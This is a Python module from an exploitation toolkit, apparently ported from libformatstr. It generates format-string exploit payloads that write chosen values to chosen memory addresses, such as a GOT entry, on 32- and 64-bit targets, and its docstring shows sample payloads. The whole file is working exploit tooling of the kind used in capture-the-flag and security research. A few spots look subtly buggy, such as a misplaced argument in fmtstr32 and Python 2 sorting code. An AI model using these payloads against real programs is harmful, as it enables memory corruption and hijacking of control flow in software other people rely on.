# -*- coding:utf-8 -*-

import sys
import operator
from collections import OrderedDict
from roppylib.util.packing import p64, u64, p32, u32
from roppylib.log import getLogger

log = getLogger(__name__)


# INPUT for setitem:
# Address:
#   Int/long: 0x08049580
#   Packed: "\x80\x95\x04\x08"
# Value:
#   Int/long: 0xdeadbeef
#   Word(0xdead)
#   Packed: "\xef\xbe\xad\xde\xce\xfa\xad\xde"
#   List of values above: [0xdeadbeef, "sc\x00\x00", "test", Word(0x1337)]


def pack(n, is64):
    if is64:
        return p64(n)
    else:
        return p32(n)


def unpack(s, is64):
    if is64:
        return u64(s)
    else:
        return u32(s)


class FormatStr:
    """
    A wrapper around https://github.com/hellman/libformatstr and ported to python3
    will let you create the format string payload automatically.

    Example:
           Python 3.8.2 (default, Apr 27 2020, 15:53:34) 
           [GCC 9.3.0] on linux
           Type "help", "copyright", "credits" or "license" for more information.
           >>> from roppy import *
           >>> got = 0x601018
           >>> write = 0x1337
           >>> offset = 7
           >>> fmtstr32(offset, {got: write})
           Warning: Can't avoid null byte at address 0x601018
           Warning: Payload contains NULL bytes.
           b'%4919c%10$nA\x18\x10`\x00'
           >>> fmtstr64(offset, {got: write})
           Warning: Can't avoid null byte at address 0x601018
           Warning: Payload contains NULL bytes.
           b'%4919c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
    
    You can also define the starting length of the payload and the padding.
    It works the both way around 32 bit and 64 bit format string.

           >>> fmtstr32(offset, {got: write}, start_len=12, pad=10)
           [WARN] Can't avoid null byte at address 0x601018
           [WARN] Payload contains NULL bytes.
           b'%4907c%10$nAAA\x18\x10`\x00'
           >>> fmtstr32(offset, {got: write}, start_len=12, pad=20)
           [WARN] Can't avoid null byte at address 0x601018
           [WARN] Payload contains NULL bytes.
           b'%4907c%10$nA\x18\x10`\x00'
           >>> fmtstr64(offset, {got: write}, start_len=12, pad=20)
           [WARN] Can't avoid null byte at address 0x601018
           [WARN] Payload contains NULL bytes.
           b'%4907c%8$nAA\x18\x10`\x00\x00\x00\x00\x00'
           >>> fmtstr64(offset, {got: write}, start_len=12, pad=40)
           [WARN] Can't avoid null byte at address 0x601018
           [WARN] Payload contains NULL bytes.
           b'%4907c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
           >>> fmtstr64(offset, {got: write}, start_len=14, pad=40)
           [WARN] Can't avoid null byte at address 0x601018
           [WARN] Payload contains NULL bytes.
           b'%4905c%9$nAAAAAA\x18\x10`\x00\x00\x00\x00\x00'
    """
    def __init__(self, buffer_size=0, isx64=0, autosort=True):
        if autosort:
            self.mem = {}
        else:
            self.mem = OrderedDict()
        self.buffer_size = buffer_size
        self.autosort = autosort
        self.isx64 = isx64
        self.parsers = {
            list: self._set_list,
            str: self._set_str,
            int: self._set_dword,
            Word: self._set_word,
            Byte: self._set_byte
        }

    def __setitem__(self, addr, value):
        addr_type = type(addr)
        if addr_type is int:
            """ Type checking for the address 
             A slight check if the payload

             """
            if self.isx64:
                addr = addr % (1 << 64)
            else:
                addr = addr % (1 << 32)
        elif addr_type == str:
            addr = unpack(addr, self.isx64)
        else:
            raise TypeError("Address must be int or packed int, not: " + str(addr_type))

        val_type = type(value)
        if val_type == type(self):  # instance...
            val_type = value.__class__

        if val_type in self.parsers:
            return self.parsers[val_type](addr, value)
        else:
            raise TypeError("Unknown type of value: " + str(val_type))

    def __getitem__(self, addr):
        return self.mem[addr]

    def _set_list(self, addr, lst):
        for i, value in enumerate(lst):
            addr = self.__setitem__(addr, value)
        return addr

    def _set_str(self, addr, s):
        for i, c in enumerate(s):
            self._set_byte(addr + i, ord(c))
        return addr + len(s)

    def _set_dword(self, addr, value):
        for i in range(4):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 4

    def _set_word(self, addr, value):
        for i in range(2):
            self.mem[addr + i] = (int(value) >> (i * 8)) % (1 << 8)
        return addr + 2

    def word(self, addr, value):
        return self._set_word(addr, value)

    def _set_byte(self, addr, value):
        self.mem[addr] = int(value) % (1 << 8)
        return addr + 1

    def byte(self, addr, value):
        return self._set_byte(addr, value)

    def dword(self, addr, value):
        return self._set_dword(addr, value)

    def payload(self, *args, **kwargs):
        gen = PayloadGenerator(self.mem, self.buffer_size, is64=self.isx64, autosort=self.autosort)
        return gen.payload(*args, **kwargs)


class PayloadGenerator:
    def __init__(self, mem=OrderedDict(), buffer_size=0, is64=0, autosort=True):
        """
        Make tuples like (address, word/dword, value), sorted by value as default.
        Trying to avoid null byte by using preceding address in the case.
        """
        self.is64 = is64
        self.mem = mem
        self.buffer_size = buffer_size
        self.tuples = []
        self.autosort = autosort
        if autosort:
            self.addrs = list(mem.keys())  # addresses of each byte to set
        else:
            self.addrs = list(sorted(mem.keys()))

        addr_index = 0
        while addr_index < len(self.addrs):
            addr = self.addrs[addr_index]
            addr = self.check_nullbyte(addr)

            dword = 0
            for i in range(4):
                if addr + i not in self.mem:
                    dword = -1
                    break
                dword |= self.mem[addr + i] << (i * 8)

            if 0 <= dword < (1 << 16):
                self.tuples.append((addr, 4, dword))
                if self.addrs[addr_index + 2] == addr + 3:
                    addr_index += 3  # backstepped
                elif self.addrs[addr_index + 3] == addr + 3:
                    addr_index += 4
                else:
                    raise ValueError("Unknown error. Missing bytes")
                continue

            word = 0
            for i in range(2):
                if addr + i not in self.mem:
                    word = -1
                    break
                word |= self.mem[addr + i] << (i * 8)

            if 0 <= word < (1 << 16):
                self.tuples.append((addr, 2, word))
                if self.addrs[addr_index] == addr + 1:
                    addr_index += 1  # backstepped
                elif self.addrs[addr_index + 1] == addr + 1:
                    addr_index += 2
                else:
                    raise ValueError("Unknown error. Missing bytes")
                continue
            else:
                if addr_index > 0 and self.addrs[addr_index - 1] > self.addrs[addr_index] - 1:
                    addr_index -= 1  # can't fit one byte, backstepping
                else:
                    self.tuples.append((addr, 1, self.mem[addr]))
                    addr_index += 1
        if autosort:
            self.tuples.sort(key=operator.itemgetter(2))
        return

    def check_nullbyte(self, addr):
        if b"\x00" in pack(addr, self.is64):
            # check if preceding address can be used
            if (addr - 1) not in self.mem or b"\x00" in pack(addr - 1, self.is64):
                # to avoid null bytes in the last byte of address, set previous byte
                log.warning("Can't avoid null byte at address " + hex(addr))
            else:
                return addr - 1
        return addr

    def payload(self, arg_index, padding=0, start_len=0):
        """
        @arg_index - index of argument, pointing to payload
        @padding - determing padding size needed to align dwords (padding will be added)
        @start_len - len of already printed data (we can't change this)
        """
        if self.is64:
            # Make it 8 bytes align for a 64 bit value
            align = 8
        else:
            align = 4
        prev_len = -1
        index = arg_index * 10000  # enough for sure
        while True:
            payload = b""
            addrs = b""
            printed = start_len
            for addr, size, value in self.tuples:
                print_len = value - printed
                if print_len < 0:  # Patchs some errors
                    if size == 1:
                        print_len &= 0xff
                    elif size == 2:
                        print_len &= 0xffff
                    elif size == 4:
                        print_len &= 0xffffffff
                if print_len > 2:
                    payload += b"%" + (str(print_len)).encode("latin") + b"c"
                elif print_len >= 0:
                    payload += b"A" * print_len
                else:
                    log.warning("Can't write a value %08x (too small) %08x." % (value, print_len))
                    continue

                modi = {
                    1: b"hh",
                    2: b"h",
                    4: b""
                }[size]
                payload += b"%" + (str(index)).encode("latin") + b"$" + modi +b"n"
                addrs += pack(addr, self.is64)
                printed += print_len
                index += 1

            payload += b"A" * ((padding - len(payload)) % align)
            if len(payload) == prev_len:
                payload += addrs  # argnumbers are set right
                break

            prev_len = len(payload)

            index = arg_index + len(payload) // align

        if b"\x00" in payload:
            log.warning("Payload contains NULL bytes.")
        return payload.ljust(self.buffer_size, b"\x90")
    


class Word:
    def __init__(self, value):
        self.value = value % (1 << 16)

    def __int__(self):
        return self.value


class Byte:
    def __init__(self, value):
        self.value = value % (1 << 8)

    def __int__(self):
        return self.value

def tuples_sorted_by_values(adict):
    """Return list of (key, value) pairs of @adict sorted by values."""
    return sorted(adict.items(), lambda x, y: cmp(x[1], y[1]))


def tuples_sorted_by_keys(adict):
    """Return list of (key, value) pairs of @adict sorted by keys."""
    return [(key, adict[key]) for key in sorted(adict.keys())]

def fmtstr32(offset, writes: dict, start_len=0, pad=0, auto_sort=True):
    p = FormatStr(auto_sort)
    for addr, value in writes.items():
        p[addr] = value
    return p.payload(offset, pad, start_len)
    
def fmtstr64(offset, writes: dict, start_len=0, pad=0, auto_sort=True):
    p = FormatStr(isx64=1,autosort=auto_sort)
    for addr, value in writes.items():
        p[addr] = value
    return p.payload(offset, pad, start_len)
